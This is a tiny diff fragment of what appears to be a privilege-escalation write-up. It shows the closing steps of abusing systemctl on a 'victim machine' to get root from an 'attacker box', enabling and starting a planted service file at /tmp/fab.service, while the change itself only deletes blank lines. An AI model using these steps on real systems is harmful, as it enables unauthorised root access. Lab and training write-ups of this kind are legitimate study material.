@@ -40,5 +40,3 @@ Now use systemctl on victim machine and we should be root from the attacker box:
 /bin/systemctl enable /tmp/fab.service
 /bin/systemctl start fab
 ```
-
-
